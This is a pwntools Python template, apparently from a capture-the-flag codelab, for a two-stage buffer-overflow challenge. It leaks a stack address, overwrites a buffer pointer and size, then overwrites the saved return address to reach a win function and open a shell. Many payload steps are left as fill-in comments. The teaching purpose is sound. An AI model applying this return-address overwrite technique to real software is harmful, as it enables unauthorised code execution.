#!/usr/bin/python3
from pwn import *

'''
Hi! Here is a template for, what I believe to be, the
simplest way to solve this challenge! I've left a bunch of
# FILL ME 
comments all over to help you out! Good luck :)
'''

win_func_addr = 0xDEADBEEF # FILL ME 

# PARAMS FOR REMOTE
do_remote = 1
remote_ip = "buffer-overflow.nu-capture-the-flag-codelab.kctf.cloud"
remote_port = 1337

if do_remote:
    p = remote(remote_ip, remote_port)
else:
    p = process("./buffer_overflow")

# This will grab the local_buf_addr and pack it
p.recvuntil(b'local_buf1 addr: ')
local_buf_addr = int(p.recvline()[:-1], 16)
local_buf_addr = p64(local_buf_addr)

'''
FIRST PAYLOAD:
Use the overflow to modify n1.buf and n1.size
to give yourself a second overflow!!!
'''
p.recvuntil(b'Write stuff into local_buf1:\n')
# TODO: Here you need to build your payload!
payload = b''
# 1. Fill local_buf

# 2. Overwrite n1.buf (I've done this for you)
# Note: local_buf_addr is 8 bytes
payload += local_buf_addr       

# 3. Overwrite n1.size

# Sending! (Note: sending a line will append a b'\x0a')
# Make sure you know how fgets() works
p.sendline(payload)


'''
SECOND PAYLOAD:
Now that you have a second overflow, you can overwrite the
saved return address on stack!!!
'''
p.recvuntil(b'right...?\n')
payload = b''
# 1. Fill local_buf

# 2. Fill n1.buf ptr

# 3. Fill n1.size

# 4. Fill rbp

# 5. Overwrite ret addr (I've done this for you)
# Note: p64(win_func_addr) is 8 bytes
payload += p64(win_func_addr) 

# Sending!
p.sendline(payload)

print(p.recv())
# Cross your fingers and hope for a shell :)
print("Attempting to spawn shell:")
p.interactive()
